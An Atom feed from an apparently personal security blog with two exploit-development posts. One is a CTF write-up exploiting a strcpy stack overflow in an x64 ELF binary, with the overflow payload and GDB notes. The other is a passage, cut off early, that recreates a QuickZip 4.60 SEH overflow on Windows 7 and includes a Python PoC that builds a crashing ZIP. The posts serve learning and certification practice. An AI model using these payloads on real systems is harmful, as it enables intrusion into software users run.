<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit Development | Knapsy's brain dump]]></title>
  <link href="http://blog.knapsy.com/blog/categories/exploit-development/atom.xml" rel="self"/>
  <link href="http://blog.knapsy.com/"/>
  <updated>2018-08-06T14:43:45+10:00</updated>
  <id>http://blog.knapsy.com/</id>
  <author>
    <name><![CDATA[Knapsy]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[FileVault CTF Challenge - ELF X64 Buffer Overflow]]></title>
    <link href="http://blog.knapsy.com/blog/2018/08/05/filevault-ctf-challenge-elf-x64-buffer-overflow/"/>
    <updated>2018-08-05T16:31:31+10:00</updated>
    <id>http://blog.knapsy.com/blog/2018/08/05/filevault-ctf-challenge-elf-x64-buffer-overflow</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been quite a while since I have done a CTF, but just very recently I got a chance to participate in one and came across a pretty interesting challenge which forced me to go back and re-learn exploit dev in Unix environments. Also had to brush up on my <code>gdb</code> knowledge&hellip;</p>

<!--more-->


<h2>Background</h2>

<p>The challenge required participants to connect to a remote server on a specific port to interact with a simple <code>FileVault</code> application.</p>

<p>Offline copy of the application has been provided for analysis.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@debian:/opt/checksec# file FileVault
</span><span class='line'>FileVault: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=24cf4afa0525b2c402542c56bbd80f585c80694f, stripped&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@debian:/opt/checksec# ./checksec.sh &ndash;file FileVault
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   FileVault&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>We&rsquo;re dealing with x64 ELF binary that doesn&rsquo;t have any protections enabled that should cause us any troubles later on.</p>

<h2>Understanding the application</h2>

<p>Let&rsquo;s play with the application and see what it does.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/Incorrect_code.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/Incorrect_code.png" alt="image" /></a></p>

<p>It expects some sort of a code (that we don&rsquo;t have).</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/2.Code_too_long.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/2.Code_too_long.png" alt="image" /></a></p>

<p>Also let&rsquo;s note that when we provide code that is too long (more than 16 characters), we get a little bit different error message.</p>

<p>Let&rsquo;s throw the application into IDA and see what is it actually supposed to be doing.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/3.Main_func_strlen_check.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/3.Main_func_strlen_check.png" alt="image" /></a></p>

<p>As you can see, we&rsquo;re reading an input string using <code>scanf()</code> and check its length with <code>strlen()</code> - if it&rsquo;s longer than 16 characters, it displays additional error message (&ldquo;Incorrect login attempted.&rdquo;).</p>

<p>However, it&rsquo;s important to note that, apart from printing that error message, it doesn&rsquo;t actually do anything else, the application just continues execution.</p>

<p>Generally you&rsquo;d think that this sort of check would cause the application to exit if the condition is not met, but it&rsquo;s not the case here - we can simply ignore it and not worry about it at all.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/5.Decision_func.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/5.Decision_func.png" alt="image" /></a></p>

<p>This one is interesting, clearly there&rsquo;s some sort of decision mechanisms that establishes whether the code is valid or not.</p>

<p>After number of checks, if everything goes fine, we get to &ldquo;Shell Access Granted&rdquo; and call subroutine <code>sub_91A</code>.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/13.execfunc.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/13.execfunc.png" alt="image" /></a></p>

<p>And this function simply calls <code>/bin/sh -i</code> giving us back an interactive shell.</p>

<h2>Digging deeper</h2>

<p>As now we have an understanding what the application is doing, let&rsquo;s see if we can bypass the authentication mechanism. Remember that we can&rsquo;t simply patch the binary out as our end-goal is to exploit a remote instance, so most likely we&rsquo;ll need to come up with a remote exploit (or find the authentication code itself).</p>

<p>The first check the application does is on a variable <code>secret_0</code> (I have renamed them myself for clarity) - if it&rsquo;s value is <code>0</code> (ASCII) then it proceeds with further checks, otherwise, it fails right there.</p>

<p>But there&rsquo;s a problem&hellip; <code>secret_0</code> is actually initialised to <code>16</code> at the very beginning of that function and it&rsquo;s not being modified anywhere else along the way. How can it then ever equal <code>0</code>?!</p>

<p>The same thing applies for <code>secret_1</code> and <code>secret_2</code> variables, which expect certain values (<code>t0k3</code> and <code>n4m3</code> respectively), but are initialised to <code>0</code> too.</p>

<p>So how can we change the value of those variables, if we never get a chance to set them&hellip; or do we? ;)</p>

<h2>Simple buffer overflow</h2>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/7.strcpy.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/7.strcpy.png" alt="image" /></a></p>

<p>Luckily for us, the application uses insecure <code>strcpy()</code> to copy user provided input into an initialised array of a set length. As <code>strcpy</code> does not do bounds checking, it simply copies entire input until it hits a NULL byte (end of a string - <code>\x00</code>), not caring about sizes at all.</p>

<p>As there are no input size checks performed by the application, we can use it try to overflow the buffer and set the relevant local variables to values we need.</p>

<p>Let&rsquo;s have a look at how the application initialises the local variables and what offsets we need to work with.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/8.calculate_offset.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/8.calculate_offset.png" alt="image" /></a></p>

<p>Let&rsquo;s analyse the above and picture how the stack will look like.</p>

<p>As the execution is passed to this subroutine, what&rsquo;s going to happen here (after the <a href="https://en.wikipedia.org/wiki/Function_prologue">function prologue</a>) is that the local variables (<code>src</code>, <code>dest</code>, <code>secret_2</code>, <code>secret_1</code> and <code>secret_0</code>) are going to be pushed onto the stack.</p>

<p>What order are they going to be pushed on? Look at the pointer arithmetic that IDA is showing us:</p>

<ul>
<li><code>secret_0</code> will end up in position of <code>base pointer (RBP)- 4 bytes</code></li>
<li><code>secret_1</code> in <code>RBP-8 bytes</code></li>
<li><code>secret_2</code> in <code>RBP-C</code> (in hex) and so on&hellip;</li>
</ul>


<p>This also gives us important information about the size of <code>dest</code> variable that we&rsquo;ll be overflowing - it&rsquo;s initiated size is, in hex, <code>20 - C</code> (difference between <code>secret_2</code> and <code>dest</code> offsets), which is <code>20 bytes</code>.</p>

<p>If we were to draw it, after initialisation of all local variables the stack will look as follows:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** Assuming each &ldquo;frame&rdquo; is 4 bytes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                  0x00000000 (lower memory addresses)
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>+&mdash;&mdash;&mdash;-+        RBP-28
</span><span class='line'>|    SRC   |
</span><span class='line'>|&mdash;&mdash;&mdash;-|
</span><span class='line'>|          |
</span><span class='line'>|&mdash;&mdash;&mdash;-|        RBP-20        ||
</span><span class='line'>|   DEST   |                      ||  strcpy() writes
</span><span class='line'>|&mdash;&mdash;&mdash;-|                      ||  this way
</span><span class='line'>|          |                     ||/
</span><span class='line'>|&mdash;&mdash;&mdash;-|                      \/
</span><span class='line'>|          |
</span><span class='line'>|&mdash;&mdash;&mdash;-|
</span><span class='line'>|          |
</span><span class='line'>|&mdash;&mdash;&mdash;-|
</span><span class='line'>|          |
</span><span class='line'>|&mdash;&mdash;&mdash;-|        RBP-C
</span><span class='line'>| SECRET_2 |
</span><span class='line'>|&mdash;&mdash;&mdash;-|        RBP-8
</span><span class='line'>| SECRET_1 |
</span><span class='line'>|&mdash;&mdash;&mdash;-|        RBP-4
</span><span class='line'>| SECRET_0 |
</span><span class='line'>+&mdash;&mdash;&mdash;-+    &lt;== RBP
</span><span class='line'>                                      0xFFFFFFFF (higher memory addresses)</span></code></pre></td></tr></table></div></figure></p>

<p>Now, having that information, we can easily deduct that in order to overflow our variables, we need to first fill up the buffer of <code>dest</code> with <code>20 bytes</code> of garbage, next <code>4 bytes</code> would be our <code>secret_2</code>, followed by <code>4 bytes</code> for <code>secret_1</code> and last <code>4 bytes</code> for <code>secret_0</code>.</p>

<p>But what do we need to put in our secret variables? Pretty simple, let&rsquo;s just see what IDA shows us:</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/5.Decision_func.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/5.Decision_func.png" alt="image" /></a></p>

<p>Easy! <code>secret_0</code> must be <code>0</code>, <code>secret_1</code> = <code>t0k3</code> and <code>secret_2</code> = <code>n4m3</code>.</p>

<p><strong>HOWEVER!</strong> Because of <a href="https://en.wikipedia.org/wiki/Endianness#Little-endian">Little Endianness</a>, the strings will have to be written <strong>in reverse</strong>!</p>

<p>So for <code>secret_1</code> and <code>secret_2</code> we&rsquo;ll need to write <code>3k0t</code> and <code>3m4n</code> respectively.</p>

<h2>Exploit</h2>

<p>Let&rsquo;s put our exploit to test! The payload we&rsquo;ll be sending is:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@debian:~# python -c &lsquo;print &ldquo;A&rdquo; * 20 + &ldquo;3m4n&rdquo; + &ldquo;3k0t&rdquo; + &ldquo;0&rdquo;&rsquo;
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA3m4n3k0t0</span></code></pre></td></tr></table></div></figure></p>

<p>And that&rsquo;s how it should look on the stack:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** Assuming each &ldquo;frame&rdquo; is 4 bytes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>BEFORE OVERFLOW                   AFTER OVERFLOW
</span><span class='line'>===============                   ==============
</span><span class='line'>                                                       0x00000000 (lower memory addresses)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> +&mdash;&mdash;&mdash;-+        RBP-28        +&mdash;&mdash;&mdash;-+
</span><span class='line'> |    SRC   |                      |          |
</span><span class='line'> |&mdash;&mdash;&mdash;-|                      |&mdash;&mdash;&mdash;-|
</span><span class='line'> |          |                      |          |
</span><span class='line'> |&mdash;&mdash;&mdash;-|        RBP-20        |&mdash;&mdash;&mdash;-|
</span><span class='line'> |   DEST   |                      |   AAAA   |         ||
</span><span class='line'> |&mdash;&mdash;&mdash;-|                      |&mdash;&mdash;&mdash;-|         ||  strcpy() writes
</span><span class='line'> |          |                      |   AAAA   |         ||  this way
</span><span class='line'> |&mdash;&mdash;&mdash;-|                      |&mdash;&mdash;&mdash;-|        ||/
</span><span class='line'> |          |                      |   AAAA   |         \/
</span><span class='line'> |&mdash;&mdash;&mdash;-|                      |&mdash;&mdash;&mdash;-|
</span><span class='line'> |          |                      |   AAAA   |
</span><span class='line'> |&mdash;&mdash;&mdash;-|                      |&mdash;&mdash;&mdash;-|
</span><span class='line'> |          |                      |   AAAA   |
</span><span class='line'> |&mdash;&mdash;&mdash;-|        RBP-C         |&mdash;&mdash;&mdash;-|          &lt;br/>
</span><span class='line'> | SECRET_2 |                      |   3m4n   |
</span><span class='line'> |&mdash;&mdash;&mdash;-|        RBP-8         |&mdash;&mdash;&mdash;-|                      &lt;br/>
</span><span class='line'> | SECRET_1 |                      |   3k0t   |
</span><span class='line'> |&mdash;&mdash;&mdash;-|        RBP-4         |&mdash;&mdash;&mdash;-|
</span><span class='line'> | SECRET_0 |                      |  0 \x00  |
</span><span class='line'> +&mdash;&mdash;&mdash;-+    &lt;== RBP           +&mdash;&mdash;&mdash;-+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                                   0xFFFFFFFF (higher memory addresses)
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s give it a shot!</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/12.success.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/12.success.png" alt="image" /></a></p>

<p>W00t W00t, access granted! :)</p>

<h2>GDB Refresher</h2>

<p>This part is basically something for me to have to refer to when I come across something similar in the future.</p>

<p>As the challenge, in the end, turned out to be quite simple, I had to do some debugging in GDB to see if my offsets are right (and also because I have completely forgot about Little Endianness and my initial exploit didn&rsquo;t work!).</p>

<p>Just to make sure that everything works as expected, load up the application in GDB <code>gdb ./FileVault</code> and set a breakpoint on one command that we&rsquo;re interested in <code>breakpoint strcpy</code>.</p>

<p>Execute the application by invoking <code>run &lt; input</code>, where <code>input</code> is simply a text file with our paload generated in python (see above).</p>

<p>The execution will stop on <code>strcpy()</code> function, step through it by pressing <code>n</code> or typing in <code>finish</code> to step out of <code>strcpy()</code> routine.</p>

<p>As we hit first <code>cmp</code> instruction, see what sits under <code>rbp-0x4</code> by issuing <code>x/x $rbp-0x4</code> command.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/9.gdb_1.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/9.gdb_1.png" alt="image" /></a></p>

<p>Since we&rsquo;re comparing a <code>DWORD</code>, we only need to worry about <code>4 bytes</code>, in our case it&rsquo;s <code>0x00000030</code> (from memory), which matches what is in the instruction call (<code>0x30</code>).</p>

<p>Continue execution and investigate the following variables exactly same way.</p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/10.gdb_2.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/10.gdb_2.png" alt="image" /></a></p>

<p><a href="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/11.gdb_3.png"><img src="/images/posts/2018-08-05-filevault-ctf-challenge-elf-x64-buffer-overflow/11.gdb_3.png" alt="image" /></a></p>

<h2>Summary</h2>

<p>All in all, it was pretty fun challenge that forced me to get back into exploit dev in Unix environments (I&rsquo;ve been mainly playing in Windows recently) and really stretched my memory on some basic concepts&hellip; which is great - gotta stay sharp! :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[QuickZip 4.60 - Win7 X64 SEH Overflow (Egghunter) With Custom Encoder]]></title>
    <link href="http://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/"/>
    <updated>2017-05-01T21:31:30+10:00</updated>
    <id>http://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder</id>
    <content type="html"><![CDATA[<p>As a part of my preparations for the <a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE</a> exam, I have been trying to find some interesting exploits and PoC code to practice my skills on and learn something new in the exploit development department.</p>

<p>After some digging, I stumbled across a <a href="https://www.exploit-db.com/exploits/11656/">QuickZip v4.60 Buffer Overflow exploit</a>, which is very well documented by <a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a> in a thorough blog post <a href="https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/">here</a>.</p>

<p>Since the exploit itself is from 2010, it was designed to work on 32-bit Windows XP only. I decided to try and see if I can recreate it on a 64-bit Windows 7 and damn, was that a (fun) challenge!</p>

<!--more-->


<h2>PoC</h2>

<p>To get started, I grabbed the <a href="https://www.exploit-db.com/exploits/11656/">QuickZip v4.60 Windows XP exploit from exploit-db</a> and cut it down to create a simple PoC triggering a crash.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">max_size</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The above code creates a ZIP of a single file named 4064 A&rsquo;s followed by a &ldquo;.txt&rdquo; extension. <code>Header_1</code>, <code>header_2</code> and <code>header_3</code> are the headers required by the ZIP file structure. I won&rsquo;t go into the details of it, but you can read more about it on <a href="https://en.wikipedia.org/wiki/Zip_(file_format">here</a>.</p>

<p>If you open the created ZIP file in QuickZip and try to extract its contents (or just double-click on the filename), the QuickZip will crash.</p>

<h2>Understanding the crash</h2>

<p>Ok, let&rsquo;s run the PoC and see what actually happens.</p>

<p>Create the ZIP file using Python script above, open it up with QuickZip, start <code>ImmunityDebugger</code>, attach to the QuickZip process and, in QuickZip, double click on the filename to trigger the crash. <strong>Note:</strong> we will be repeating this process over, and over, and over again, so get used to it!</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png" alt="image" /></a></p>

<p>Awesome, we triggered a crash as expected. Also, we got an exception - see the bottom of the screen <em>&ldquo;Access violation when writing to [00190000]&rdquo;</em>. What this means is that we were trying to write to an invalid memory address and we triggered an exception.</p>

<p>Let&rsquo;s investigate the SEH chain.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png" alt="image" /></a></p>

<p>Great, it appears that we&rsquo;re able to control nSEH pointer! Looks very promising. Let&rsquo;s try to figure out the offsets.</p>

<h2>Offsets</h2>

<p>As always, I&rsquo;m going to be using <code>mona</code> (<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>) to help us out with a lot of tasks here.</p>

<p>First, let&rsquo;s generate a pattern of <strong>4064</strong> unique characters and put it in the payload of our PoC exploit:
<code>
!mona pc 4064
</code></p>

<p>Let&rsquo;s trigger the crash again and see what happens.</p>

